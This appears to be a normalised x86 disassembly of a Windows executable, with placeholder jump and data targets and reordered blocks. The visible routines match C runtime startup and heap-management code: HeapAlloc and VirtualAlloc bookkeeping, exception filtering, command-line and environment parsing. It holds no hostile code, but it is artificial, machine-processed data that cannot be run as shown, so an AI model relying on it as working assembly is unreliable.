cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_40a781
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40a6d0
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_40a6d0
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_40a781
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_40a87c
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_40ab72
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_40ab8d
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_40ca9d
add esp 0x1c
test eax eax
jne r-xdata
sub_40ac10
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40ac44
push ebp
mov ebp esp
push ecx
push ebx
push esi
call sub_4090c1
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_40ad82
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x54 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop esi
pop ebx
leave
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
push edi
cmp edx ecx
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x58 ]
cmp eax 0xc000008e
jne r-xdata
lea ecx [ edx + edx * 2 ]
shl ecx 0x2
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x58 ] 0x83
jmp r-xdata
mov edi [ esi + 0x50 ]
add ecx 0xc
and [ ecx + edi - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x58 ] 0x81
jmp r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x58 ] edi
pop ecx
pop edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x58 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x58 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x58 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x58 ] 0x86
jmp r-xdata
mov [ esi + 0x58 ] 0x8a
sub_40ad82
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax ] esi
je r-xdata
cmp [ eax ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_40adbc
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_408093
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_40d689
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_40ae14
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_408093
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_406c98
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_406ec2
pop ecx
push esi
call sub_40c460
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_406c50
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_406c98
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_40c460
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_406430
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_406ec2
pop ecx
sub_40aecd
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_408093
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_40af66
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_406c98
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_40af66
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_406ec2
pop ecx
sub_40af66
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_40b11a
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_406c98
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_406c98
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_4073d0
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_406c50
pop ecx
mov [ esp + 0x10 ] ebx
sub_40b24c
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_406c98
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_406ec2
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
